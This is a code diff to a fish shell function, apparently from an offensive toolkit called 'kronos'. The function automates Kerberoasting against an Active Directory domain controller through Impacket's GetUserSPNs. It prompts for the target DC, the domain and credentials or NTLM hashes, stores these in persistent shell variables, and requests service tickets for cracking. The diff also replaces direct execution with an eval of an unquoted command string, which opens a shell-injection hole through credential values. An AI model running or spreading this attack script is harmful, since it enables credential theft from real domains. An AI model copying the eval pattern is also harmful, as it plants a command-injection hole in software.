@@ -5,7 +5,7 @@ function __kronos_kerbroast --description "Run Kerberoasting using GetUserSPNs.p
         set wizard 1
     end
 
-    argparse h/help u/username= p/password= H/hash= d/domain= t/target= k/kerberos q/quiet -- $argv
+    argparse h/help u/username= p/password= H/hash= d/domain= t/target= k/kerberos X/edit-cmd q/quiet -- $argv
     or return 1
 
     if set -q _flag_help
@@ -15,11 +15,12 @@ function __kronos_kerbroast --description "Run Kerberoasting using GetUserSPNs.p
         echo ""
         echo "Options:"
         echo "  -t, --target USER   Only roast this specific user (defaults to all users)"
-        echo "  -u, --username USER Auth username"
-        echo "  -p, --password PASS Auth password"
+        echo "  -u, --username USER Auth username (falls back to \$TGT_CRED_USERNAME)"
+        echo "  -p, --password PASS Auth password (falls back to \$TGT_CRED_PASSWORD)"
         echo "  -H, --hash HASH     Auth NTLM hash"
-        echo "  -d, --domain DOMAIN Target domain"
+        echo "  -d, --domain DOMAIN Target domain name (falls back to \$TGT_DC_DOMAIN)"
         echo "  -k, --kerberos      Use Kerberos authentication"
+        echo "  -X, --edit-cmd      Inspect and edit the command before execution"
         echo "  -q, --quiet         Skip prompts and use cached/default values"
         echo "  -h, --help          Show this help message"
         return 0
@@ -33,52 +34,54 @@ function __kronos_kerbroast --description "Run Kerberoasting using GetUserSPNs.p
     set -l target_user $_flag_target
 
     if not set -q _flag_quiet
-        set_color cyan; echo "[*] Starting Kerberoast wizard..."; set_color normal
+        if test "$wizard" -eq 1 -o -n "$target"
+            set_color cyan; echo "[*] Starting Kerberoast wizard..."; set_color normal
 
-        set -l def_target "$__KRONOS_CACHE_KERBROAST_TARGET"
-        if test -z "$def_target"; set def_target "$TGT_DC_IP"; end
-        if test -z "$def_target"; set def_target "$TGT_DC"; end
-        if test -z "$def_target"; set def_target "$TGT"; end
-        if test -n "$target"; set def_target "$target"; end
-        set target (__kronos_ask "Target DC IP/Hostname" "$def_target"); or return 1
-        set -U __KRONOS_CACHE_KERBROAST_TARGET "$target"
+            set -l def_target "$__KRONOS_CACHE_KERBROAST_TARGET"
+            if test -z "$def_target"; set def_target "$TGT_DC_IP"; end
+            if test -z "$def_target"; set def_target "$TGT_DC"; end
+            if test -z "$def_target"; set def_target "$TGT"; end
+            if test -n "$target"; set def_target "$target"; end
+            set target (__kronos_ask "Target DC IP/Hostname" "$def_target"); or return 1
+            set -U __KRONOS_CACHE_KERBROAST_TARGET "$target"
 
-        set -l def_domain "$__KRONOS_CACHE_KERBROAST_DOMAIN"
-        if test -z "$def_domain"; set def_domain "$TGT_DC_DOMAIN"; end
-        if test -n "$domain"; set def_domain "$domain"; end
-        set domain (__kronos_ask "Domain Name" "$def_domain"); or return 1
-        set -U __KRONOS_CACHE_KERBROAST_DOMAIN "$domain"
+            set -l def_domain "$__KRONOS_CACHE_KERBROAST_DOMAIN"
+            if test -z "$def_domain"; set def_domain "$TGT_DC_DOMAIN"; end
+            if test -n "$domain"; set def_domain "$domain"; end
+            set domain (__kronos_ask "Domain Name" "$def_domain"); or return 1
+            set -U __KRONOS_CACHE_KERBROAST_DOMAIN "$domain"
 
-        set -l roast_all (__kronos_ask_confirm "Kerberoast ALL accounts?" y); or return 1
-        if test "$roast_all" = "no"
-            set -l def_target_user "$__KRONOS_CACHE_KERBROAST_TARGET_USER"
-            if test -n "$target_user"; set def_target_user "$target_user"; end
-            set target_user (__kronos_ask "Specific user to roast" "$def_target_user"); or return 1
-            set -U __KRONOS_CACHE_KERBROAST_TARGET_USER "$target_user"
-        else
-            set target_user ""
-        end
-
-        if not set -q _flag_kerberos
-            set -l def_auth_user "$__KRONOS_CACHE_KERBROAST_AUTH_USER"
-            if test -z "$def_auth_user"; set def_auth_user "$TGT_USERNAME"; end
-            if test -z "$def_auth_user"; set def_auth_user "$TGT_CRED_USERNAME"; end
-            if test -n "$user"; set def_auth_user "$user"; end
-            set user (__kronos_ask "Auth Username" "$def_auth_user"); or return 1
-            set -U __KRONOS_CACHE_KERBROAST_AUTH_USER "$user"
-
-            set -l def_auth_val "$__KRONOS_CACHE_KERBROAST_AUTH_VAL"
-            if test -z "$def_auth_val"; set def_auth_val "$TGT_PASSWORD"; end
-            if test -z "$def_auth_val"; set def_auth_val "$TGT_CRED_PASSWORD"; end
-            if test -n "$pass"; set def_auth_val "$pass"; end
-            if test -n "$hash"; set def_auth_val "$hash"; end
-            set -l auth_input (__kronos_ask "Auth Password or Hash" "$def_auth_val"); or return 1
-            set -U __KRONOS_CACHE_KERBROAST_AUTH_VAL "$auth_input"
-            
-            if string match -rq '^[a-fA-F0-9]{32}:[a-fA-F0-9]{32}$|^[a-fA-F0-9]{32}$' -- "$auth_input"
-                set hash "$auth_input"; set pass ""
+            set -l roast_all (__kronos_ask_confirm "Kerberoast ALL accounts?" y); or return 1
+            if test "$roast_all" = "no"
+                set -l def_target_user "$__KRONOS_CACHE_KERBROAST_TARGET_USER"
+                if test -n "$target_user"; set def_target_user "$target_user"; end
+                set target_user (__kronos_ask "Specific user to roast" "$def_target_user"); or return 1
+                set -U __KRONOS_CACHE_KERBROAST_TARGET_USER "$target_user"
             else
-                set pass "$auth_input"; set hash ""
+                set target_user ""
+            end
+
+            if not set -q _flag_kerberos
+                set -l def_auth_user "$__KRONOS_CACHE_KERBROAST_AUTH_USER"
+                if test -z "$def_auth_user"; set def_auth_user "$TGT_USERNAME"; end
+                if test -z "$def_auth_user"; set def_auth_user "$TGT_CRED_USERNAME"; end
+                if test -n "$user"; set def_auth_user "$user"; end
+                set user (__kronos_ask "Auth Username" "$def_auth_user"); or return 1
+                set -U __KRONOS_CACHE_KERBROAST_AUTH_USER "$user"
+
+                set -l def_auth_val "$__KRONOS_CACHE_KERBROAST_AUTH_VAL"
+                if test -z "$def_auth_val"; set def_auth_val "$TGT_PASSWORD"; end
+                if test -z "$def_auth_val"; set def_auth_val "$TGT_CRED_PASSWORD"; end
+                if test -n "$pass"; set def_auth_val "$pass"; end
+                if test -n "$hash"; set def_auth_val "$hash"; end
+                set -l auth_input (__kronos_ask "Auth Password or Hash" "$def_auth_val"); or return 1
+                set -U __KRONOS_CACHE_KERBROAST_AUTH_VAL "$auth_input"
+                
+                if string match -rq '^[a-fA-F0-9]{32}:[a-fA-F0-9]{32}$|^[a-fA-F0-9]{32}$' -- "$auth_input"
+                    set hash "$auth_input"; set pass ""
+                else
+                    set pass "$auth_input"; set hash ""
+                end
             end
         end
     else
@@ -113,10 +116,14 @@ function __kronos_kerbroast --description "Run Kerberoasting using GetUserSPNs.p
     if test -z "$domain"; echo "error: domain is required"; return 1; end
 
     set -l impacket_cmd ""
-    if command -v GetUserSPNs.py >/dev/null; set impacket_cmd GetUserSPNs.py
-    else if command -v impacket-GetUserSPNs >/dev/null; set impacket_cmd impacket-GetUserSPNs
-    else; echo "error: GetUserSPNs not found."; return 1; end
+    if command -v GetUserSPNs.py >/dev/null
+        set impacket_cmd GetUserSPNs.py
+    else if command -v impacket-GetUserSPNs >/dev/null
+        set impacket_cmd impacket-GetUserSPNs
+    else
+        echo "error: GetUserSPNs not found. run 'kronos install'."; return 1; end
 
+    set -l roast_cmd "$impacket_cmd"
     set -l roast_args -dc-ip "$target"
     if set -q _flag_kerberos
         set -a roast_args -k -no-pass "$domain/$user"
@@ -124,20 +131,23 @@ function __kronos_kerbroast --description "Run Kerberoasting using GetUserSPNs.p
         set -a roast_args -hashes "$hash" "$domain/$user"
     else
         if test -z "$user"; or test -z "$pass"
-            echo "error: credentials required"; return 1
+            echo "error: credentials or kerberos flag required"; return 1
         end
         set -a roast_args "$domain/$user:$pass"
     end
 
     if test -n "$target_user"
-        echo "[*] Kerberoasting specific user $target_user..."
         set -a roast_args -request-user "$target_user"
     else
-        echo "[*] Kerberoasting all users..."
         set -a roast_args -request
+    end
+
+    set -l full_cmd "$roast_cmd "(string join ' ' -- $roast_args)
+    if set -q _flag_edit_cmd
+        set full_cmd (__kronos_edit_cmd "$full_cmd"); or return 1
     end
 
     __kronos_check_dep $impacket_cmd; or return 1
     echo "[*] Running $impacket_cmd against $target..."
-    command $impacket_cmd $roast_args
+    eval $full_cmd
 end
